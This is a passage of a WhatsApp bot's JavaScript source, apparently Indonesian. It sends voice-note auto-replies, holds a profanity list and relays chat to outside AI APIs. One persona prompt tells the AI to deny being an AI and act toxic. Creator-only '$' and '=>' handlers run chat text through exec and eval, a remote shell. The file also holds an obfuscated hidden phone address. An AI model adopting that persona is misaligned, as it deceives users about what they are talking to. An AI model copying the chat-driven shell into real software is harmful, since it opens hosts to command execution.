Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/lopyou.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })

}
if (m.text.toLowerCase() == "hy") {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/adaapa1.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })

}
if (m.text.toLowerCase() == "kak") {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/adaapa1.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })

}
//ppp
if (m.text.toLowerCase() == "sv") {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/ga mau.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })

}

//0l3r
if ((budy.match) && ["kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

//===
Ditss.CAI = Ditss.CAI ? Ditss.CAI : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!Ditss.CAI[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (Ditss.CAI[sender] && m.text) {
        let name = Ditss.getName(sender);
        //await Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cai.neekoi.me/cai?char=FRdKHnLG4JF6I14PexPWFvVyfrp-nZi6NFcoljmPPPM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
    }
    //powered by ditss
// Pasang di bawah paling bawah, //di dekat default 
Ditss.autoai = Ditss.autoai || {};
if (m?.isBaileys && m?.fromMe) return;
if (!m?.text) return;
if (!Ditss.autoai[m?.sender]) return;
const skipPrefixes = [".", "#", "!", "/", "\\"];
if (skipPrefixes.some(prefix => m?.text?.startsWith(prefix))) return;
try {
    // Prompt untuk API GPT
    const prompt = `Kamu adalah asuma Asisten, kamu bukanlah AI atau chatbot, kamu adalah anak remaja dengan sifat kasar dan toxic. Kamu berbicara dengan bahasa gaul Indonesia, seperti "lu" untuk "kamu" dan "gw" untuk "aku".`;

    let hasil;

    if (m?.text) {
        // Jika pesan berupa teks
        const response = await fetch(
            "https://restapii.rioooxdzz.web.id/api/gptlogic?message=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}"
        ).catch(() => null);

        if (!response) throw new Error("Gagal menghubungi API.");
        const gpt = await response.json();
        if (gpt?.data?.response) {
            hasil = gpt.data.response;
        } else {
            throw new Error("Gagal mendapatkan respons dari API.");
        }

        // Kirimkan hasil respons ke pengguna
        m.reply(hasil || "Tidak ada respons dari sistem.");
    }
    if (m.text.toLowerCase().includes("lagu")) {
        const search = await yts(m.text);
        const videoUrl = search.all[0]?.url;
        if (!videoUrl) throw new Error("Lagu tidak ditemukan.");

        const res = await ytdl(videoUrl);
        const laguUrl = res?.data?.url;

        await Ditss.sendMessage(m.chat, {
            audio: { url: laguUrl },
            mimetype: 'audio/mpeg',
            fileName: 'Riooo.mp3',
            contextInfo: {
                forwardingScore: 999999999,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: false,
                    containsAutoReply: true,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    title: search.all[0].title,
                    body: `Durasi lagu: ${search.all[0].timestamp}`,
                    previewType: "PHOTO",
                    thumbnailUrl: search.all[0].thumbnail,
                }
            }
        }, { quoted: m });
    }
    if (m.text.toLowerCase().includes("foto")) {
        const query = m.text.split("foto")[1]?.trim();
        if (!query) throw new Error("Harap tulis kata kunci setelah 'foto'. Contoh: carikan saya foto kucing.");

        const ress = await fetch(`https://restapii.rioooxdzz.web.id/api/search-pinterest?message=${encodeURIComponent(query)}`);
        const pin = await ress.json();

        if (!pin?.data?.response) throw new Error("Gambar tidak ditemukan.");

        const Pinterest = pin.data.response;

        await Ditss.sendMessage(m.chat, {
            image: { url: Pinterest },
            caption: `Berikut adalah gambar hasil pencarian untuk: "${query}"`,
        }, { quoted: m });
    }
    if (m.text.toLowerCase().includes("block")) {
        const numbersOnly = m.isGroup
            ? (m.text.replace(/\D/g, '') || m.quoted?.sender)
            : m.chat;

        if (!numbersOnly) throw new Error("Nomor tidak valid untuk diblokir.");

        await Ditss.updateBlockStatus(numbersOnly, 'block')
            .then(() => m.reply("Nomor berhasil diblokir."))
            .catch(() => m.reply("Gagal memblokir nomor."));
    }

} catch (err) {
    // Tangani error
    console.error("Error:", err);
    await Ditss.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` }, { quoted: m });
}
//ai2
Ditss.asuma = Ditss.asuma ? Ditss.asuma : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!Ditss.asuma[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (Ditss.asuma[sender] && m.text) {
        let name = Ditss.getName(sender);
        //await Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

        try {
            const C1 = require('node-fetch')
            const spychat22 = body.replace().slice().trim()
            const V1 = await C1("https://cai.neekoi.me/cai?char=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM&message=" + encodeURIComponent(spychat22));
            const L1 = await V1.json();
            const answer1 = L1.reply;
            m.reply(answer1)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("gatauu.");
        }
    }
    
    //autoai 3
   
 
//========
if ((m.mtype === 'groupInviteMessage' || m.text.startsWith('Undangan untuk bergabung') || m.text.startsWith('Invitation to join') || m.text.startsWith('Buka tautan ini')) && !m.isBaileys && !m.isGroup) {
await Ditss.sendMessage(m.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'group apa itu'
m.reply(teks)
}
//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
Ditss.sendMessage("666666666666@s.whatsapp.net", {text: `
*fitur error kak silahkan lapor owner:*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});